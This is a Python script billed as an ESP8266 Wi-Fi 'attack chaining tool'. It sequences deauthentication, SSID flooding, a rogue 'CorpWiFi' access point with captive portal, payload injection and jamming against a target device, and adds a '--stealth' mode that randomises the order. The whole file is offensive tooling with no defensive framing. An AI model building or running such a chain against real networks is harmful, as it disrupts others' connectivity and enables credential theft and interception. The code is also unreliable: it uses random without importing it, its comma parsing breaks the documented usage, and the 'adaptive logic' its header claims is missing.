import argparse
import os
import time

# -------------------------------------------
# ESP8266 - Automated Attack Chaining Tool
# -------------------------------------------
# Features:
# - Automates multiple Wi-Fi attack techniques in sequence
# - Chains deauth, SSID flooding, Evil Twin, and MITM attacks
# - Adaptive attack logic based on detected vulnerabilities
# - Supports randomized execution order for stealth
# - Logs attack results for analysis
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Run full automated attack sequence:
#    python esp8266_auto_attack.py --full
# 2. Execute specific attack sequences:
#    python esp8266_auto_attack.py --sequence "deauth, ssid-flood, rogue-ap"
# 3. Enable randomized execution order for stealth:
#    python esp8266_auto_attack.py --full --stealth
# 4. Log attack results for analysis:
#    python esp8266_auto_attack.py --full --log
# -------------------------------------------

def run_attack(command):
    """Executes a specific attack command."""
    print(f"[+] Executing: {command}")
    os.system(command)
    time.sleep(2)

def full_attack_sequence(stealth=False, log=False):
    """Runs a full automated attack sequence."""
    attacks = [
        "python esp8266_deauth.py --target AA:BB:CC:DD:EE:FF",
        "python esp8266_ssid_flood.py --spoof 'FakeWiFi' --count 30",
        "python esp8266_rogue_ap.py --ssid 'CorpWiFi' --captive-portal",
        "python esp8266_packet_injector.py --inject 'MaliciousPayload' --target AA:BB:CC:DD:EE:FF",
        "python esp8266_wifi_jammer.py --target AA:BB:CC:DD:EE:FF"
    ]
    
    if stealth:
        random.shuffle(attacks)
    
    for attack in attacks:
        run_attack(attack)
    
    if log:
        os.system("python deauther.py log > attack_log.txt")
        print("[✔] Attack results saved to attack_log.txt")

def custom_attack_sequence(sequence, stealth=False, log=False):
    """Runs a custom attack sequence defined by the user."""
    attack_map = {
        "deauth": "python esp8266_deauth.py --target AA:BB:CC:DD:EE:FF",
        "ssid-flood": "python esp8266_ssid_flood.py --spoof 'FakeWiFi' --count 30",
        "rogue-ap": "python esp8266_rogue_ap.py --ssid 'CorpWiFi' --captive-portal",
        "packet-inject": "python esp8266_packet_injector.py --inject 'MaliciousPayload' --target AA:BB:CC:DD:EE:FF",
        "wifi-jammer": "python esp8266_wifi_jammer.py --target AA:BB:CC:DD:EE:FF"
    }
    
    attacks = [attack_map[attack] for attack in sequence.split(",") if attack in attack_map]
    
    if stealth:
        random.shuffle(attacks)
    
    for attack in attacks:
        run_attack(attack)
    
    if log:
        os.system("python deauther.py log > attack_log.txt")
        print("[✔] Attack results saved to attack_log.txt")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Automated Attack Chaining Tool")
    parser.add_argument("--full", action='store_true', help="Run full automated attack sequence")
    parser.add_argument("--sequence", type=str, help="Run a specific attack sequence (comma-separated)")
    parser.add_argument("--stealth", action='store_true', help="Randomize attack execution order for stealth")
    parser.add_argument("--log", action='store_true', help="Log attack results")
    args = parser.parse_args()

    if args.full:
        full_attack_sequence(args.stealth, args.log)
    elif args.sequence:
        custom_attack_sequence(args.sequence, args.stealth, args.log)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
